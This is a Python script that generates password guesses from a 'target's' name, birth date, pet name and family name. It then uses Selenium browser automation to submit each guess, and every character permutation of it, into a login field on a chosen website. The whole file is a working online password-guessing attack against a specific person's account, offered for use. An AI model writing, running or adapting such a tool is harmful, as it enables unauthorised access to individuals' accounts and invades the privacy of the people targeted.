import itertools
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

def generate_passwords(name, birth_date, other_info, pet_name, family_name):
    # Extract day, month, and year from the birth date
    day, month, year = birth_date.split('/')

    # Generate specific combinations based on the target's information
    info_combinations = [
            name + day,
        name + month,
        name + year,
        name + day + month,
        name + day + year,
        name + month + day,
        name + month + year,
        name + year + day,
        name + year + month,
        name.capitalize() + day,
        name.capitalize() + month,
        name.capitalize() + year,
        name.capitalize() + day + month,
        name.capitalize() + day + year,
        name.capitalize() + month + day,
        name.capitalize() + month + year,
        name.capitalize() + year + day,
        name.capitalize() + year + month,
        name.lower() + day,
        name.lower() + month,
        name.lower() + year,
        name.lower() + day + month,
        name.lower() + day + year,
        name.lower() + month + day,
        name.lower() + month + year,
        name.lower() + year + day,
        name.lower() + year + month,
        name.upper() + day,
        name.upper() + month,
        name.upper() + year,
        name.upper() + day + month,
        name.upper() + day + year,
        name.upper() + month + day,
        name.upper() + month + year,
        name.upper() + year + day,
        name.upper() + year + month,
        name + day + month + year,
        name + year + month + day,
        name.capitalize() + day + month + year,
        name.capitalize() + year + month + day,
        name.lower() + day + month + year,
        name.lower() + year + month + day,
        name.upper() + day + month + year,
        name.upper() + year + month + day,
        pet_name,
        pet_name + day,
        pet_name + month,
        pet_name + year,
        pet_name + day + month,
        pet_name + day + year,
        pet_name + month + day,
        pet_name + month + year,
        pet_name + year + day,
        pet_name + year + month,
        pet_name.capitalize() + day,
        pet_name.capitalize() + month,
        pet_name.capitalize() + year,
        pet_name.capitalize() + day + month,
        pet_name.capitalize() + day + year,
        pet_name.capitalize() + month + day,
        pet_name.capitalize() + month + year,
        pet_name.capitalize() + year + day,
        pet_name.capitalize() + year + month,
        pet_name.lower() + day,
        pet_name.lower() + month,
        pet_name.lower() + year,
        pet_name.lower() + day + month,
        pet_name.lower() + day + year,
        pet_name.lower() + month + day,
        pet_name.lower() + month + year,
        pet_name.lower() + year + day,
        pet_name.lower() + year + month,
        pet_name.upper() + day,
        pet_name.upper() + month,
        pet_name.upper() + year,
        pet_name.upper() + day + month,
        pet_name.upper() + day + year,
        pet_name.upper() + month + day,
        pet_name.upper() + month + year,
        pet_name.upper() + year + day,
        pet_name.upper() + year + month,
        family_name,
        family_name + day,
        family_name + month,
        family_name + year,
        family_name + day + month,
        family_name + day + year,
        family_name + month + day,
        family_name + month + year,
        family_name + year + day,
        family_name + year + month,
        family_name.capitalize() + day,
        family_name.capitalize() + month,
        family_name.capitalize() + year,
        family_name.capitalize() + day + month,
        family_name.capitalize() + day + year,
        family_name.capitalize() + month + day,
        family_name.capitalize() + month + year,
        family_name.capitalize() + year + day,
        family_name.capitalize() + year + month,
        family_name.lower() + day,
        family_name.lower() + month,
        family_name.lower() + year,
        family_name.lower() + day + month,
        family_name.lower() + day + year,
        family_name.lower() + month + day,
        family_name.lower() + month + year,
        family_name.lower() + year + day,
        family_name.lower() + year + month,
        family_name.upper() + day,
        family_name.upper() + month,
        family_name.upper() + year,
        family_name.upper() + day + month,
        family_name.upper() + day + year,
        family_name.upper() + month + day,
        family_name.upper() + month + year,
        family_name.upper() + year + day,
        family_name.upper() + year + month,
        name + family_name,
        name + family_name + day,
        name + family_name + month,
        name + family_name + year,
        name + family_name + day + month,
        name + family_name + day + year,
        name + family_name + month + day,
        name + family_name + month + year,
        name + family_name + year + day,
        name + family_name + year + month,
        name.capitalize() + family_name,
        name.capitalize() + family_name + day,
        name.capitalize() + family_name + month,
        name.capitalize() + family_name + year,
        name.capitalize() + family_name + day + month,
        name.capitalize() + family_name + day + year,
        name.capitalize() + family_name + month + day,
        name.capitalize() + family_name + month + year,
        name.capitalize() + family_name + year + day,
        name.capitalize() + family_name + year + month,
        name.lower() + family_name,
        name.lower() + family_name + day,
        name.lower() + family_name + month,
        name.lower() + family_name + year,
        name.lower() + family_name + day + month,
        name.lower() + family_name + day + year,
        name.lower() + family_name + month + day,
        name.lower() + family_name + month + year,
        name.lower() + family_name + year + day,
        name.lower() + family_name + year + month,
        name.upper() + family_name,
        name.upper() + family_name + day,
        name.upper() + family_name + month,
        name.upper() + family_name + year,
        name.upper() + family_name + day + month,
        name.upper() + family_name + day + year,
        name.upper() + family_name + month + day,
        name.upper() + family_name + month + year,
        name.upper() + family_name + year + day,
        name.upper() + family_name + year + month
    ]

    return info_combinations

# Prompt the user for personal information
name = input("Enter the target's name: ")
birth_date = input("Enter the target's birth date (in dd/mm/yyyy format): ")
other_info = input("Enter any other personal information: ")
pet_name = input("Enter the target's pet name: ")
family_name = input("Enter the target's family name: ")

# Generate potential passwords
passwords = generate_passwords(name, birth_date, other_info, pet_name, family_name)

# Website interaction code
website = input("Enter the website URL: ")
xpath = input("Enter the XPath for the input field: ")
time_sleep = 0.5

service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service)
driver.get(website)
input_message_box = driver.find_element(by=By.XPATH, value=xpath)
time.sleep(time_sleep)

print("The process can now start")

for combination in passwords:
    for length in range(1, len(combination) + 1):
        # Generate all possible permutations of the combination
        permutations = itertools.permutations(combination, length)
        for permutation in permutations:
            password = ''.join(permutation)
            input_message_box.send_keys(password)
            input_message_box.send_keys(Keys.ENTER)
            input_message_box.clear()
            time.sleep(time_sleep)
